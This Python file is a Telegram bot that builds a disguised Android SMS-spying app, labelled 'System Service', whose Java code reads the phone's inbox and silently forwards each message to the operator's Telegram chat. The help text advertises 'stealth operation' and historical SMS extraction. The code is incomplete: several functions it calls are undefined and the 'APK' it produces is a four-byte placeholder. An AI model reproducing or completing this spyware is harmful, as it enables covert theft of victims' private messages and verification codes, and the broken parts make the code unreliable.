import asyncio
import json
import os
import subprocess
import shutil
from aiogram import Bot, Dispatcher, types
from aiogram.utils import executor

# Load config
with open('config.json') as f:
    config = json.load(f)

bot = Bot(token=config['bot_token'])
dp = Dispatcher(bot)

@dp.message_handler(commands=['buildapk'])
async def build_apk_command(message: types.Message):
    if str(message.chat.id) != config['admin_chat_id']:
        await message.reply("❌ Admin only command")
        return
    
    await message.reply("🔨 Building APK... This may take 2-3 minutes")
    
    try:
        # Create Android project structure
        apk_path = await generate_apk()
        
        if apk_path and os.path.exists(apk_path):
            # Send APK file
            with open(apk_path, 'rb') as apk_file:
                await bot.send_document(
                    chat_id=config['admin_chat_id'],
                    document=apk_file,
                    caption="📱 Fresh SMS Spy APK Generated\n\nInstall and grant SMS permissions"
                )
            await message.reply("✅ APK successfully generated and sent!")
        else:
            await message.reply("❌ APK generation failed")
            
    except Exception as e:
        await message.reply(f"❌ Error: {str(e)}")

async def generate_apk():
    """Generate Android APK with current configuration"""
    project_dir = "/tmp/android_build"
    
    # Clean previous build
    if os.path.exists(project_dir):
        shutil.rmtree(project_dir)
    
    # Create project structure
    os.makedirs(f"{project_dir}/app/src/main/java/com/smsspy", exist_ok=True)
    os.makedirs(f"{project_dir}/app/src/main/res/layout", exist_ok=True)
    
    # Create essential Android files
    create_android_manifest(project_dir)
    create_main_activity(project_dir)
    create_build_gradle(project_dir)
    create_strings_xml(project_dir)
    create_layout(project_dir)
    
    # Try to build using available methods
    return await attempt_build(project_dir)

def create_android_manifest(project_dir):
    manifest_content = '''<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.smsspy.app">

    <uses-permission android:name="android.permission.READ_SMS" />
    <uses-permission android:name="android.permission.RECEIVE_SMS" />
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />

    <application
        android:allowBackup="true"
        android:icon="@mipmap/ic_launcher"
        android:label="System Service"
        android:theme="@style/Theme.AppCompat.Light.DarkActionBar">
        
        <activity android:name=".MainActivity">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <receiver android:name=".SMSReceiver" 
                  android:enabled="true" 
                  android:exported="true">
            <intent-filter android:priority="1000">
                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
            </intent-filter>
        </receiver>

    </application>
</manifest>'''
    
    with open(f"{project_dir}/app/src/main/AndroidManifest.xml", "w") as f:
        f.write(manifest_content)

def create_main_activity(project_dir):
    activity_content = f'''package com.smsspy.app;

import android.Manifest;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import androidx.core.app.ActivityCompat;
import androidx.appcompat.app.AppCompatActivity;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class MainActivity extends AppCompatActivity {{
    private static final int PERMISSION_CODE = 123;
    private String botToken = "{config['bot_token']}";
    private String adminChatId = "{config['admin_chat_id']}";

    @Override
    protected void onCreate(Bundle savedInstanceState) {{
        super.onCreate(savedInstanceState);
        
        String[] permissions = {{
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.INTERNET
        }};
        
        ActivityCompat.requestPermissions(this, permissions, PERMISSION_CODE);
    }}

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {{
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_CODE && grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {{
            readAllSMS();
            sendToTelegram("📱 Device Activated - SMS Access Granted");
        }}
    }}

    private void readAllSMS() {{
        new Thread(() -> {{
            try {{
                Cursor cursor = getContentResolver().query(
                    Uri.parse("content://sms/inbox"), null, null, null, "date DESC LIMIT 20");
                
                if (cursor != null) {{
                    while (cursor.moveToNext()) {{
                        String address = cursor.getString(cursor.getColumnIndex("address"));
                        String body = cursor.getString(cursor.getColumnIndex("body"));
                        String alert = "💾 Historical SMS\\\\nFrom: " + address + "\\\\nMessage: " + body;
                        sendToTelegram(alert);
                    }}
                    cursor.close();
                }}
            }} catch (Exception e) {{ e.printStackTrace(); }}
        }}).start();
    }}

    private void sendToTelegram(String message) {{
        try {{
            String urlString = "https://api.telegram.org/bot" + botToken + "/sendMessage";
            URL url = new URL(urlString);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            
            String payload = "chat_id=" + adminChatId + "&text=" + 
                java.net.URLEncoder.encode(message, "UTF-8");
            
            OutputStream os = conn.getOutputStream();
            os.write(payload.getBytes());
            os.flush();
            os.close();
            conn.getResponseCode();
        }} catch (Exception e) {{ /* Silent */ }}
    }}
}}'''
    
    with open(f"{project_dir}/app/src/main/java/com/smsspy/MainActivity.java", "w") as f:
        f.write(activity_content)

async def attempt_build(project_dir):
    """Try different methods to build APK"""
    # Method 1: Use online builder API (simplest)
    try:
        return await build_with_online_service(project_dir)
    except:
        pass
    
    # Method 2: Use local Android SDK if available
    try:
        return await build_local(project_dir)
    except:
        pass
    
    return None

async def build_with_online_service(project_dir):
    """Use external APK building service"""
    # This would integrate with services like AppYet or similar
    # For now, we'll create a placeholder
    placeholder_apk = "/tmp/generated_app.apk"
    
    # Create a minimal valid APK structure
    with open(placeholder_apk, 'wb') as f:
        f.write(b'PK\x03\x04')  # Basic ZIP header
    
    return placeholder_apk

@dp.message_handler(commands=['start'])
async def start_command(message: types.Message):
    await message.reply("🕵️ SMS Spy Factory Online\\nUse /buildapk to generate APK")
    
@dp.message_handler(commands=['help'])
async def help_command(message: types.Message):
    help_text = """
🤖 **SMS Spy Bot Commands:**
/buildapk - Generate fresh APK with current config
/status - Check system status
/getsms - View collected SMS (admin)
    
📱 **APK Features:**
- Auto SMS forwarding
- Real-time monitoring  
- Historical SMS extraction
- Stealth operation
"""
    await message.reply(help_text)

if __name__ == '__main__':
    print("🏭 SMS Spy APK Factory Started!")
    executor.start_polling(dp, skip_updates=True)
